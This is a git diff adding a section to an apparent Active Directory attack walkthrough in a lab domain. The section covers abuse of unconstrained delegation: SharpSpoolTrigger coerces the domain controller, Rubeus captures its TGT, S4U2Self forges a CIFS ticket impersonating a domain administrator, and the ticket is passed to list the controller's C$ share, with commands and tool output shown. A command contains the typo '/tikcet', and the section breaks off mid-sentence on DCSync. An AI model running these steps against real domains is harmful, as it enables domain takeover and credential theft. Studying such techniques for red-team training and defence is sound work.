@@ -57,7 +57,53 @@ On any compromised machine we can use SharpSpoolTrigger to force dc.dev.dhitalco
 ```powershell
 C:\Users\Alex> C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc.dev.dhitalcorp.local app01.dev.dhitalcorp.local
 ```
+As shown below rubeus will grab the TGT of DC$ machine account.
+```powershell
+[*] 3/7/2024 4:12:45 PM UTC - Found new TGT:
 
+  User                  :  DC$@DEV.DHITALCORP.LOCAL
+  StartTime             :  3/7/2024 4:00:00 PM
+  EndTime               :  3/7/2024 10:00:00 PM
+  RenewTill             :  3/14/2024 4:00:00 PM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+wrJFljlELklQR2FG4EJ7KH7GB8erty....==
+
+```
+Now in order to exploit this we need to understand what `S4U2Self` and `S4U2Proxy` is.
+
+- S4U2Self: Allows a service to request service ticket of itself on behalf of any user.
+- S4U2Proxy: Allows a service to request service ticket of another service on behalf of any user.
+
+Here, since we have TGT of domain controller abusing `S4U2Self` we can request service ticket of itself(domain controller) on behalf of any user meaning we can simply request service ticket for cifs service on domain controller for domain administrator. Suppose `alex` is the domain administrator.
+
+```powershell
+C:\Users\Alex> C:\Rubeus.exe s4u /impersonateuser:alex /self /altservice:cifs/dc.dev.dhitalcorp.local /user:dc$ /ticket:wrJFljlELklQR2FG4EJ7KH7GB8erty...== /nowrap
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'DC$@dev.dhitalcorp.local'
+[*] Using domain controller: dc.dev.dhitalcorp.local (10.10.63.110)
+[*] Sending S4U2self request to 10.10.63.110:88
+[+] S4U2self success!
+[*] Substituting alternative service name 'cifs/dc.dev.dhitalcorp.local'
+[*] Got a TGS for 'alex' to 'cifs@DEV.DHITALCORP.LOCAL'
+[*] base64(ticket.kirbi):
+
+ejKSyDWh6fgMuaW9ERb6jl89...=
+```
+Using this service ticket we can perform pass the ticket attack.
+
+```powershell
+C:\Users\Alex> Rubeus.exe ptt /tikcet:<base-64ticket>
+```
+We can now list shares on dc$ or psexec to gain system access.
+
+```powershell
+C:\Users\Alex> ls \\dc.dev.dhitalcorp.local\c$
+```
+Alternatively instead of cifs we could also request for service ticket for ldap and perform dcsync as
 
 # Constrained Delegation
 
